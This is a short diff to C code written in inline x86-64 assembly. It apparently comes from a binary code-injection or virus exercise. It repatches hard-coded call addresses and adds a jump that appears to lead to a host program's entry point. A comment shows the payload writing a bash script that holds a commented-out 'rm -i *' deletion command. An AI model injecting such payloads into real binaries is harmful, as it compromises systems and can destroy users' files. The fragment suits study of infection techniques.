@@ -29,7 +29,7 @@ void main() {
 	__asm__ ( "movq %rsp,%rdi\n\t");
 	__asm__ ( "movl $0x0,%eax\n\t");
 
-	__asm__ ( "callq 0x400490\n\t");  
+	__asm__ ( "callq 0x402310\n\t");  
 
 	// copy "#!/bin/bash\n#rm -i *\n" to the current stack)
 	__asm__ ( "sub $0x18,%rsp\n\t");
@@ -46,7 +46,8 @@ void main() {
 	__asm__ ( "movl %eax,%edi\n\t");
 	__asm__ ( "movl $0x0,%eax\n\t");
 
-	__asm__ ( "callq 0x400470\n\t");
+	__asm__ ( "callq 0x401f10\n\t");
+	__asm__ ( "jmp 0x408ac8\n\t");
 
 	// restore %rsp
 	__asm__ ( "add $0x18,%rsp\n\t");
